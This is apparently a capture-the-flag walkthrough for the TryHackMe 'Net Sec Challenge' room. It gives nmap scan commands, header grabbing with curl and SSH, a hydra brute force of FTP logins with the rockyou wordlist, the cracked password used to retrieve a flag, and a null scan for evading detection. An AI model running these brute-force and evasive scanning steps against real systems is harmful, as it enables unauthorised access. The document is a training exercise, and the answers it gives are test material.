# Net Sec Challenge

**Room Link:** [https://tryhackme.com/room/netsecchallenge](https://tryhackme.com/room/netsecchallenge)



**What is the highest port number being open less than 10,000?**

```
nmap -sV -sT -O -p 1-10000 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (4) (10).png" alt=""><figcaption></figcaption></figure>

**There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (5) (2) (3).png" alt=""><figcaption></figcaption></figure>

**How many TCP ports are open?**

6

**What is the flag hidden in the HTTP server header?**

```
curl http://$VICTIM -I
```

<figure><img src="../../.gitbook/assets/image (65) (2).png" alt=""><figcaption></figcaption></figure>

**What is the flag hidden in the SSH server header?**

```
ssh -v $VICTIM
```

<figure><img src="../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>

**We have an FTP server listening on a nonstandard port. What is the version of the FTP server?**

```
vsftpd 3.0.3
```

\
**We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?**

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$VICTIM:10021
```

<figure><img src="../../.gitbook/assets/image (58) (2).png" alt=""><figcaption></figcaption></figure>

```
ftp $VICTIM  10021
Name (10.10.129.189:root): quinn
Password: andrea
ftp> get ftp_flag.txt
```

<figure><img src="../../.gitbook/assets/image (62) (2).png" alt=""><figcaption></figcaption></figure>

**Browsing to `http://10.10.129.189:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?**

```
nmap -sN $VICTIM
```
